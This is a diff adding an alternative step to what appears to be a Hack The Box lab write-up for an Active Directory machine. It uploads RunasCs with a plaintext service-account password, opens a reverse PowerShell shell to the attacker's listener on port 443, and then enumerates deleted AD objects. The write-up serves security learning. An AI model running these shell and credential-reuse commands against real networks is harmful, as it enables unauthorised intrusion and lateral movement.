@@ -512,6 +512,72 @@ bloodyAD -H DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_lda
 Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
 [+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
 ```
+
+## Alternative
+
+```
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload RunasCs.exe
+                                        
+Info: Uploading /home/kali/tools/RunasCs/RunasCs.exe to C:\Users\svc_winrm\Documents\RunasCs.exe
+                                        
+Data: 68948 bytes of 68948 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.74:443
+[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6764 created in background.
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
+
+```
+
+```
+rlwrap -cAr nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53642
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\svc_ldap
+PS C:\Windows\system32>  Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+ Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+
+PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+
+
+Deleted           : True
+DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
+LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+Name              : Todd Wolfe
+                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+ObjectClass       : user
+ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+
+PS C:\Windows\system32> 
+
+```
 ---
 ## Privilege Escalation
 
